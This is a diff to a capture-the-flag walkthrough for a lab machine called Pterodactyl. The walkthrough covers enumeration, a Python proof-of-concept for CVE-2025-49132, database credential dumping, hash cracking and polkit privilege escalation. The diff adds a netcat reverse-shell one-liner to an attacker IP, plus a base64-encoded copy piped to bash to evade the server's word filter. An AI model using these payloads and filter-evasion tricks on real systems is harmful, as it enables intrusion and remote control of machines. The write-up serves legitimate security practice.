@@ -1,4 +1,3 @@
-
 # Pterodactyl Machine: Complete Work-through
 
 Hello everyone! This is your helpful guide to mastering the **Pterodactyl** machine. If you want to learn more about what Pterodactyl is and how the system works, check out the official documentation.
@@ -23,7 +22,6 @@ nmap -sV -sC 10.129.4.120
     
 - **HTTPS (443)**: Domain server.
     
-
 ### Web Enumeration
 
 Let's add the domain to our `/etc/hosts` file:
@@ -56,7 +54,7 @@ I developed a refined version of the PoC to provide an interactive-like shell ex
 
 Python
 
-```
+```python
 """
 This is just a proof of concept of CVE-2025-49132 and the original author of this cve is 0xtensho
 I tired my self to make the exploite easier and useful for reediting it 
@@ -116,6 +114,22 @@ if __name__ == "__main__":
             pterodactly.exploit(command)
 ```
 
+
+ after that you can simply too obtain reverse shell 
+
+first i tired the normal reverse shell command and encoded it to base64 but may server block it
+the server blocks many words  but this payloads works you just have to encode it in base64 
+
+```
+(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.61 4444 >/tmp/f) & 
+```
+
+```
+echo KHJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8YmFzaCAtaSAyPiYxfG5jIDEwLjEwLjE2LjYxIDQ0NDQgPi90bXAvZikgJg==|base64 -d |bash
+```
+
+ and boom we got  a reverse shell !!
+ 
 ---
 
 ## 3. Lateral Movement & Database Access
@@ -132,18 +146,15 @@ mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 -P 3306 panel
 
 In the `panel` database, the `users` table contains account details and password hashes:
 
-SQL
 
-```
-USE panel;
+```sql
 SELECT username, password FROM users;
 ```
 
 We obtained a hash for the user `phileasfogg3`. Using **John the Ripper**:
 
-Bash
 
-```
+```bash
 john --wordlist=rockyou.txt hash.txt
 ```
 
@@ -151,9 +162,7 @@ john --wordlist=rockyou.txt hash.txt
 
 We can now log in via SSH:
 
-Bash
-
-```
+```bash
 ssh phileasfogg3@pterodactyl.htb
 ```
 
@@ -185,6 +194,18 @@ I used a PoC for **CVE-2025-6019**.
     
 
 The exploit failed initially because `allow_active` was not set to `yes`. This requires bypassing the SSH session restriction using **CVE-2025-6018**.
+
+What "allow_active" Means:
+
+Polkit (formerly PolicyKit) has three authorization levels for actions:
+
+    allow_any - Anyone (including remote/unprivileged users) - requires authentication
+
+    allow_inactive - Local inactive sessions (usually GUI sessions on non-active displays)
+
+    allow_active - Physical users at the console (highest trust level)
+
+You've tricked the system into thinking you're a physical user sitting at the computer, which unlocks many privileged operations.
 
 Following the instructions in the [Bugzilla report](https://bugzilla.suse.com/show_bug.cgi?id=1243226), I changed the status to `yes`, allowing the execution of the previous CVE.
 
